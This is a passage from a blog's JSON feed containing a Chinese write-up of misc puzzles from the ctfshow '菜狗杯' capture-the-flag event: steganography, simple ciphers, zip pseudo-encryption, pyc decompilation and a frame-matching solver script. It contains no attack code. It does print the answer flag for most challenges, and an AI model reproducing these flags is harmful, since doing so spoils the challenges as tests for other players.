{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"ctfshow\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.github.io",
    "items": [
        {
            "id": "http://dpm12345.github.io/2022/11/25/CTF/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/",
            "url": "http://dpm12345.github.io/2022/11/25/CTF/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/",
            "title": "菜狗杯",
            "date_published": "2022-11-25T15:10:32.000Z",
            "content_html": "<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h1>\n<h2 id=\"杂项签到\"><a class=\"anchor\" href=\"#杂项签到\">#</a> 杂项签到</h2>\n<p>得到 1 张图片。010 打开，直接搜索 <code>ctfshow</code>  得到 flag</p>\n<p><code>ctfshow&#123;a62b0b55682d81f7f652b26147c49040&#125;</code></p>\n<h2 id=\"损坏的压缩包\"><a class=\"anchor\" href=\"#损坏的压缩包\">#</a> 损坏的压缩包</h2>\n<p>压缩包损坏，010 打开，发现为 PNG 头。修改后缀为 png，正常打开，发现 flag</p>\n<p><code>ctfshow&#123;e19efe2eb86f10ccd7ca362110903cO5&#125;</code></p>\n<h1 id=\"谜之栅栏\"><a class=\"anchor\" href=\"#谜之栅栏\">#</a> 谜之栅栏</h1>\n<p>解压后得到两个图片，名称为找不同</p>\n<p>在 010 中打开，利用工具项的比较文件功能，可以看到两个不同点</p>\n<p><code>cfhwfaab2cb4af5a5820&#125;</code>  和 <code>tso&#123;06071f997b5bdd1a</code></p>\n<p>在根据题目说的迷之栅栏，应该为栅栏密码，而且看着很像为 2 个密码</p>\n<p>解密得 <code>ctfshow&#123;f0a6a0b721cfb949a7fb55ab5d8d210a&#125;</code></p>\n<h1 id=\"你会数数吗\"><a class=\"anchor\" href=\"#你会数数吗\">#</a> 你会数数吗？</h1>\n<p>使用 010editor 的 工具→直方图 统计计数解得 flag，或者复制出来词频统计</p>\n<p>按照频次降序排，得到</p>\n<p><code>ctfshow&#123;a1b2d3e4g56i7j8k9l0&#125;</code></p>\n<h1 id=\"你会异或吗\"><a class=\"anchor\" href=\"#你会异或吗\">#</a> 你会异或吗？</h1>\n<p>010 异或 0x50</p>\n<p><code>ctfshow&#123;030dOf5073ab4681d30866d1fdf10ab1&#125;</code></p>\n<h1 id=\"flag一分为二\"><a class=\"anchor\" href=\"#flag一分为二\">#</a> flag 一分为二</h1>\n<p>解压后得到一张图片</p>\n<p>部分一：盲水印提取 (目前没有找到工具，需要理解一下原理)</p>\n<p><code>ctfshow&#123;FirstP@RT</code></p>\n<p>部分二：修改图片高</p>\n<p><code>SecondP@rTMikumiku~&#125;</code></p>\n<p><code>ctfshow&#123;FirstP@RTSecondP@rTMikumiku~&#125;</code></p>\n<h1 id=\"我是谁\"><a class=\"anchor\" href=\"#我是谁\">#</a> 我是谁？？</h1>\n<p>可以手动找，但有点多</p>\n<p>脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> lxml <span class=\"token keyword\">import</span> html</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> cv2</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://xxxxxxxxxxxxxxxxxxxx.challenge.ctf.show\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sess<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>all_girl<span class=\"token operator\">=</span>sess<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'/static/all_girl.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'all_girl.png'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>all_girl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>big_pic<span class=\"token operator\">=</span>cv2<span class=\"token punctuation\">.</span>imdecode<span class=\"token punctuation\">(</span>np<span class=\"token punctuation\">.</span>fromfile<span class=\"token punctuation\">(</span><span class=\"token string\">'all_girl.png'</span><span class=\"token punctuation\">,</span> dtype<span class=\"token operator\">=</span>np<span class=\"token punctuation\">.</span>uint8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> cv2<span class=\"token punctuation\">.</span>IMREAD_UNCHANGED<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>big_pic<span class=\"token operator\">=</span>big_pic<span class=\"token punctuation\">[</span><span class=\"token number\">50</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>image_alpha <span class=\"token operator\">=</span> big_pic<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>mask_img<span class=\"token operator\">=</span>np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>big_pic<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>big_pic<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>uint8<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>mask_img<span class=\"token punctuation\">[</span>np<span class=\"token punctuation\">.</span>where<span class=\"token punctuation\">(</span>image_alpha <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>imwrite<span class=\"token punctuation\">(</span><span class=\"token string\">'big.png'</span><span class=\"token punctuation\">,</span>mask_img<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">answer_one</span><span class=\"token punctuation\">(</span>sess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">#获取视频文件</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        response<span class=\"token operator\">=</span>sess<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'/check'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'ctfshow&#123;'</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        tree<span class=\"token operator\">=</span>html<span class=\"token punctuation\">.</span>fromstring<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        element<span class=\"token operator\">=</span>tree<span class=\"token punctuation\">.</span>xpath<span class=\"token punctuation\">(</span><span class=\"token string\">'//source[@id=\"vsource\"]'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        video_path<span class=\"token operator\">=</span>element<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        video_bin<span class=\"token operator\">=</span>sess<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span>video_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Question.mp4'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>video_bin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token comment\">#获取有效帧</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        video <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>VideoCapture<span class=\"token punctuation\">(</span><span class=\"token string\">'Question.mp4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        frame<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">while</span> frame<span class=\"token operator\">&lt;=</span><span class=\"token number\">55</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                res<span class=\"token punctuation\">,</span> image <span class=\"token operator\">=</span> video<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                frame<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token comment\">#cv2.imwrite('temp.png',image)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        video<span class=\"token punctuation\">.</span>release<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token comment\">#获取剪影</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        image<span class=\"token operator\">=</span>image<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">:</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span><span class=\"token number\">250</span><span class=\"token punctuation\">:</span><span class=\"token number\">500</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        gray_image<span class=\"token operator\">=</span>cv2<span class=\"token punctuation\">.</span>cvtColor<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span>cv2<span class=\"token punctuation\">.</span>COLOR_BGR2GRAY<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token comment\">#cv2.imwrite('gray_image.png',gray_image)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        temp <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">250</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>uint8<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        temp<span class=\"token punctuation\">[</span>np<span class=\"token punctuation\">.</span>where<span class=\"token punctuation\">(</span>gray_image<span class=\"token operator\">>=</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token comment\">#去白边</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        temp <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">not</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        temp <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">not</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token comment\">#缩放至合适大小，肉眼大致判断是 1.2 倍，不一定准</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        temp <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>fx<span class=\"token operator\">=</span><span class=\"token number\">1.2</span><span class=\"token punctuation\">,</span>fy<span class=\"token operator\">=</span><span class=\"token number\">1.2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token comment\">#查找位置</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        res <span class=\"token operator\">=</span>cv2<span class=\"token punctuation\">.</span>matchTemplate<span class=\"token punctuation\">(</span> mask_img<span class=\"token punctuation\">,</span>temp<span class=\"token punctuation\">,</span>cv2<span class=\"token punctuation\">.</span>TM_CCOEFF_NORMED<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        min_val<span class=\"token punctuation\">,</span> max_val<span class=\"token punctuation\">,</span> min_loc<span class=\"token punctuation\">,</span> max_loc <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>minMaxLoc<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        x<span class=\"token punctuation\">,</span>y<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>max_loc<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">/</span><span class=\"token number\">192</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>max_loc<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">/</span><span class=\"token number\">288</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#为什么是 192 和 288，因为大图去掉标题栏就是 1920*2880</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        guess<span class=\"token operator\">=</span><span class=\"token string\">'ABCDEFGHIJ'</span><span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token string\">'0123456789'</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'guess:</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>guess<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token comment\">#传答案</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        response<span class=\"token operator\">=</span>sess<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'/submit?guess='</span><span class=\"token operator\">+</span>guess<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        r<span class=\"token operator\">=</span>json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">if</span> r<span class=\"token punctuation\">[</span><span class=\"token string\">'result'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'guess right!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'guess wrong!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>i<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">while</span> i<span class=\"token operator\">&lt;=</span><span class=\"token number\">31</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'Round:</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">if</span> answer_one<span class=\"token punctuation\">(</span>sess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                i<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>                i<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></table></figure><p><code>ctfshow&#123;f25746ff-1bea-4afb-a0b7-2ed04bc5e4ff&#125;</code></p>\n<h1 id=\"you-and-me\"><a class=\"anchor\" href=\"#you-and-me\">#</a> You and me</h1>\n<p>盲水印，使用工具 BlindWaterMark-master</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python3 bwmforpy3.py decode you.png you_and_me.png wm2.png</pre></td></tr></table></figure><p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/misc/you_and_me.png\" alt=\"you_and_me\" /></p>\n<p><code>ctfshow&#123;CDEASEFFR8846&#125;</code></p>\n<h1 id=\"7105\"><a class=\"anchor\" href=\"#7105\">#</a> 7.1.05</h1>\n<p>游戏工具题，比较麻烦，暂时不做</p>\n<h1 id=\"黑丝白丝还有什么丝\"><a class=\"anchor\" href=\"#黑丝白丝还有什么丝\">#</a> 黑丝白丝还有什么丝？</h1>\n<p>白丝为  <code>.</code>  黑丝为  <code>-</code>  转场为  <code> </code></p>\n<p>看视频手敲： <code>.-- ....- -. - - ----- -... ...-- -- --- .-. . -.-. ..- - .</code></p>\n<p>解码得 <code>W4NTT0B3MORECUTE</code></p>\n<p><code>ctfshow&#123;W4NTT0B3MORECUTE&#125;</code></p>\n<h1 id=\"我吐了你随意\"><a class=\"anchor\" href=\"#我吐了你随意\">#</a> 我吐了你随意</h1>\n<p>0 宽隐写</p>\n<p>直接网站解 http://330k.github.io/misc_tools/unicode_steganography.html</p>\n<p>得 <code>ctfshow&#123;OP_is_for_Over_Power&#125;</code></p>\n<h1 id=\"这是个什么文件\"><a class=\"anchor\" href=\"#这是个什么文件\">#</a> 这是个什么文件</h1>\n<p>第一步是压缩包伪加密，把 0900 改为 0000</p>\n<p>解压得到一个文件，010 打开</p>\n<p>发现为 python 相关文件，猜测为 <code>pyc</code>  文件，需要反编译</p>\n<p>uncompyle6 反编译</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>uncompyle6 <span class=\"token parameter variable\">-o</span> <span class=\"token number\">1</span>.py <span class=\"token number\">2</span>.pyc</pre></td></tr></table></figure><p>得到</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># uncompyle6 version 3.8.0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># Python bytecode 3.7.0 (3394)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Decompiled from: Python 3.10.4 | packaged by conda-forge | (main, Mar 30 2022, 08:38:02) [MSC v.1916 64 bit (AMD64)]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Embedded file name: 2.py</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># Compiled at: 2022-10-23 13:57:28</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># Size of source mod 2**32: 148 bytes</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">109</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行后得到 <code>ctfshow&#123;cdjnjd_565f_GCDH_kcrim&#125;</code></p>\n<h1 id=\"抽象画\"><a class=\"anchor\" href=\"#抽象画\">#</a> 抽象画</h1>\n<p>得到一个 txt 文件，像是 base 编码</p>\n<p>basecrack 使用，得到</p>\n<pre><code>89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 00 00 00 49 00 00 00 12 08 03 00 00 00 20 e4 03 da 00 00 00 3f 50 4c 54 45 ff ff ff ff c0 c0 ff ff c0 c0 ff c0 c0 ff ff c0 c0 ff ff c0 ff ff 00 00 ff ff 00 00 ff 00 00 ff ff 00 00 ff ff 00 ff c0 00 00 c0 c0 00 00 c0 00 00 c0 c0 00 00 c0 c0 00 c0 ff ff ff 00 00 00 cc 44 ef f2 00 00 01 91 49 44 41 54 38 8d ad 94 d9 6e 03 21 0c 45 cd 32 6c 83 87 45 f9 ff 6f ad c1 06 d2 aa 95 fa 90 a3 3c 20 f0 d8 d7 17 13 f0 a8 4a 31 4c b4 17 73 3b d5 09 e7 72 ee 8c c3 87 d1 a5 46 a2 98 d6 56 70 2b 0e 36 ba a1 f7 1e 3c f4 9c 6b b2 93 3b 95 c8 84 71 38 00 5a c0 13 82 d6 fa 6d f3 b2 f1 64 ba 99 96 e5 14 43 d4 93 40 2a 64 65 b8 80 4d 97 6b 17 22 2a 08 61 09 0d b9 48 a6 e8 34 6d a0 93 5e 58 d8 6f a2 58 d0 f8 da e8 29 51 b6 71 35 d8 e1 9b 98 f0 24 da 40 46 3d 85 31 b5 a5 6a 87 7d 93 ac 96 da a7 9b d3 9d b6 b5 4e 83 8e 10 48 91 14 4c 86 94 9e 9d f3 b9 89 0f 3b ca 14 85 5a e5 9d e9 4f 0d 44 9d d8 c4 54 f0 da 9c 0e c0 d3 cf e5 84 2b 53 52 86 3e 8d 34 09 47 88 07 72 62 97 a6 f3 18 6b d1 e2 f1 0f 4b ad 5d 99 30 fe e9 cb 16 73 67 a6 fb a0 06 14 af 94 ac 9a 5e 89 12 99 b0 ab b0 a1 63 a9 dc 2d e3 67 a3 4c ef 90 c6 ab 37 1b 29 4e 32 d9 f6 e3 f2 c6 ed 89 41 95 0e f7 9c fb 29 e4 84 32 c5 a8 24 99 5c 19 77 42 a5 f3 5d a5 19 20 9f b6 2b 34 44 73 7e 96 ec 66 a5 4a 4a 8f 0c fc 1a 4c f0 48 a9 b7 3d cc d5 71 bc bb f1 fa 96 41 cc 13 93 89 f4 de 24 ec 8e fd bc 96 70 29 f2 7a 4d 2c 95 a2 db e0 aa c7 21 ed c5 60 f4 8a 04 9f b9 6f f5 0c 26 d0 83 83 b7 82 f4 b7 f0 76 7f e0 5f f0 29 3e 95 ea e5 3f 26 ea f5 9f 44 5f ed ce 23 44 59 16 0b e7 00 00 00 00 49 45 4e 44 ae 42 60 82\n</code></pre>\n<p>89504e 开头，png 